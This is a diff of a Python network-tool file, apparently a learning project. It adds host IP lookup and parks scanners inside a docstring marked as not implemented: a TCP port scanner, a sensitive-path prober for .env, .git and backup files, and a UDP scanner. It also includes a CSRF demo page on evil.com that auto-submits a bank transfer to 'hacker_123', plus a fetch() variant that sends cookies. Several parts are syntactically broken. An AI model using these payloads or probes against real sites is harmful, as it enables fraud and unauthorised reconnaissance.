@@ -14,16 +14,30 @@ import socket
 from urllib.parse import urlparse
 import logging
 
+from aiohttp.log import client_logger
+from httpx import AsyncClient
+from mitmproxy.connection import Client
+from tornado.netutil import is_valid_ip
+
+
+def ensure_protocol(domain):
+    default1 = 'https'
+    if not domain.startswith('http://') and not domain.startswith('https://'):
+        return f'{default1}://{domain}'
+    return domain
+
 
 def get_host_ip(full_domain:str) -> dict:
     if not full_domain:
         return {'success':'False','message':'illegal domain name, please check again'}
+    full_domain = ensure_protocol(full_domain)
     parsed_domain = urlparse(full_domain)
     hostname = parsed_domain.hostname
 
     try:
-        ip = socket.gethostbyname(hostname)
-        return {'success':True, 'message':f'the host = {hostname},ip = {ip}'}
+        ipv4 = socket.gethostbyname(hostname)
+        ipv6 = socket.getaddrinfo(hostname,None, socket.AF_INET6)
+        return {'success':True, 'message':f'the host = {hostname},ipv4 = {ipv4} ipv6={ipv6}'}
     except socket.gaierror as e:
         return {'success':'error','message':'illegal domain name, please check again'}
     except Exception as e:
@@ -31,52 +45,216 @@ def get_host_ip(full_domain:str) -> dict:
 
 
 
-def 666(target_ip)
+"""
+Due to the sensitive nature of the following functions, in order to comply with laws and maintain social/cyberspace order, these functions will not be implemented.
+
+
+
+def socket_scanner(ip:str,port:str) -> dict:
+    #no scapy because syn scan is same then attack symbol
+    sock = None
     try:
-        if not target_ip:
-            return render_template('ipportscan.html',result="You need to write the ip")
+        port = int(port)
+    except (ValueError,TypeError):
+        return{'success':False,'message':'invalid port'}
+    except Exception as e:
+        #wtf this can be error?
+        logging.error(f'Error:{e}!')
+        return {'success': 'error', 'message': f'System error'}
+    if not is_valid_ip(ip) or not is_valid_port(port):
+        return{'success':False,'message':'invalid ip or port'}
+    if ':' in ip:
 
-        input_target_port = request.form.get('target_ports')
-        if not input_target_port:
-            target_ports = [80, 443, 22, 21, 53]#default port
+        try:
+            sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((ip,port,0,0))
+            if result == 0:
+                return {'success':True, 'message':f'ip:{ip} port: {port} is open'}
+            else:
+                return {'success': False, 'message': f'ip:{ip} port: {port} is closed'}
+        except socket.timeout as e:
+            logging.error(f'TimeoutError:{e}!')
+            return {'success': 'error', 'message': f'Web connect error'}
+        except OSError as e:
+            if e.errno == 97:
+                return {'success': 'error', 'message': f"ip does not support ipv6"}
+            else:
+                logging.error(f'Error:{e}!')
+                return {'success': 'error', 'message': f'System error'}
+
+        except Exception as e:
+            logging.error(f'Error:{e}!')
+            return {'success': 'error', 'message': f'System error'}
+        finally:
+            if sock:
+                sock.close()
+
+
+    try:
+        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((ip,port))
+        if result == 0:
+            return {'success':True, 'message':f'ip:{ip} port: {port} is open'}
         else:
-            if ',' in input_target_port:
-                target_ports= [int(port.strip())for port in input_target_port.split(',')]
+            return {'success': False, 'message': f'ip:{ip} port: {port} is closed'}
+    except socket.timeout as e:
+        logging.error(f'TimeoutError:{e}!')
+        return {'success': 'error', 'message': f'Web connect error'}
+    except Exception as e:
+        logging.error(f'Error:{e}!')
+        return{'success':'error','message':f'system error'}
+    finally:
+        if sock:
+            sock.close()
+
+
+
+
+
+from urllib.parse import urlparse
+import httpx
+import asyncio
+class httpx_scanner:
+    def __init__(self,base_url:str):
+        if base_url.endswith('/'):
+            try:
+                base_url = base_url.removesuffix('/')
+                parsed_url = urlparse(base_url)
+                scheme = parsed_url.scheme
+                netloc = parsed_url.netloc
+                if scheme:
+                    self.url = f'{scheme}://{netloc}'
+                else:
+                    self.url = f"https://{netloc}"
+            except (TypeError,ValueError):
+                return {'success':False,'message':'url needs to be str'}
+            self.paths =[""
+                    "admin", "administrator", "login", "dashboard", "manager",
+                    "admin/login", "wp-admin", "admincp",
+                    # API接口
+                    "api", "api/v1", "graphql", "rest", "json",
+                    "api/docs", "swagger", "openapi",
+                    # 配置文件
+                    ".env", "config.php", "config.json", "settings.py",
+                    "web.config", "config/database.php",
+                    # 备份文件
+                    "backup", "backup.zip", "dump.sql", "backup.sql",
+                    "wwwroot.rar", "site.tar.gz",
+                    # 日志文件
+                    "logs", "log", "access.log", "error.log",
+                    # 敏感目录
+                    ".git", ".svn", ".DS_Store", "phpinfo.php",
+                    "test", "debug", "console",
+                    # 常见文件
+                    "robots.txt", "sitemap.xml", "crossdomain.xml",
+                    "package.json", "composer.json"
+                ]
+    async def single_scan(self,client,url,path):
+        try:
+            full_url = f"{url}/{path}"
+            response = await client.get(full_url,timeout = 2)
+            if response.status_code >199 and response.status_code < 400:
+                return {'success':'path find','message':f'{path}'}
             else:
-                target_ports = [int(input_target_port)]
-        for port in target_ports:
-            if port<1 or port>65535:
-                return render_template('ipportscan.html',result="The port can't be bigger then 65535 or smaller then 1(port should be 1-65535)")
-
-        if len(target_ports) > 50:
-            return render_template('ipportscan.html',result="You cannot scan too many ports at once (maximum 50)")
-
-        scan_result = []
-        for port in target_ports:
-            src_port = random.randint(50000, 65535)
-            ip_layer = IP(dst=target_ip)#where do u send IP层
-            tcp_layer = TCP(sport=src_port,dport=port,flags="S")#how which port and flag=syn 更低
-
-
-
-
-            response = sr1(ip_layer / tcp_layer, timeout=1, verbose=0)
-
-            if response:
-                if response.haslayer(TCP):
-                    tcp_layer = response.getlayer(TCP)
-                    if tcp_layer.flags == 0x12:  # SYN-ACK syn=0x2 ack=0x10
-                        scan_result.append(f"Port {port}: Open")
-                    elif tcp_layer.flags == 0x14:  # RST-ACK rst=0x4 ack=0x10
-                        scan_result.append(f"Port {port}: closed")
+                return {'success':None}
+        except Exception as e:
+            return{'success':f'error:{e}'}
+    async def httpx_scan(self,url):
+        try:
+            async with httpx.AsyncClient(headers={'User-Agent': 'Mozilla/5.0'},follow_redirects=True, verify=False) as client:
+            tasks = [self.single_scan(client,url,path) for path in self.paths]
+            futures = await asyncio.gather(*tasks,return_exceptions=True)
+            result = [future for future in futures
+                      if isinstance(future,dict) and future.get('success') == 'path find']
+            if result:
+                result_str = '\n'.join(item['message'] for item in result)
+                return{'success':True,'message':f'{result}'}
             else:
-                 scan_result.append(f"Port {port}: Filtered/No response")
-        scan_result_text = '<br>'.join(scan_result)
+                return{'success':True,'message':f'There is not paths'}
+        except httpx.TimeoutException:
+            return {'success': False, 'message': f'error: timeout'}
+        except httpx.ConnectError:
+            return {'success': False, 'message': f'error: ConnectError'}
+        except httpx.InvalidURL:
+            return {'success': False, 'message': f'error: Invalid URL'}
+        except Exception as e:
+            return {'success': False, 'message': f'error: {e}'}
+bro……costs me two hours
 
 
 
 
 
-print(result)
-def socket_scanner(ip):
-    sock = socket.socket(socket.inet)
+
+
+<!-- evil.com 上的恶意页面 -->
+<html>
+<body>
+    <!-- 隐藏的iframe或自动提交表单 -->
+    <form id="csrfForm" action="https://bank.com/transfer" method="POST">
+        <input type="hidden" name="to_account" value="hacker_123">
+        <input type="hidden" name="amount" value="10000">
+        <input type="hidden" name="note" value="这是CSRF攻击演示">
+    </form>
+    
+    <script>
+        // 页面加载后自动提交表单
+        document.getElementById('csrfForm').submit();
+    </script>
+    
+    <h1>欢迎来到抽奖网站！</h1>
+    <p>您可能中奖了...</p>
+</body>
+</html>
+
+
+<script>
+// 现代方式 - 使用fetch API
+fetch('https://bank.com/transfer', {
+    method: 'POST',
+    credentials: 'include',  // 关键！携带Cookie
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        to_account: 'hacker_123', 
+        amount: 10000
+    })
+})
+</script>
+
+
+
+
+
+import socket
+import time
+
+
+def udp_scan(target_ip, port):
+
+    
+    
+    try:
+
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.settimeout(3)
+
+            sock.sendto(b'hello!!!', (target_ip, port))
+    
+            try:
+    
+                data, addr = sock.recvfrom(1024)
+                print(f"{ip}:{port}:[OPEN]")
+
+            except socket.timeout:
+                print(f"{ip}:{port}:filtered")
+
+            except ConnectionRefusedError:
+                return "closed"
+
+    except Exception as e:
+        return f"error: {str(e)}"
+    finally:
+        sock.close()
+"""
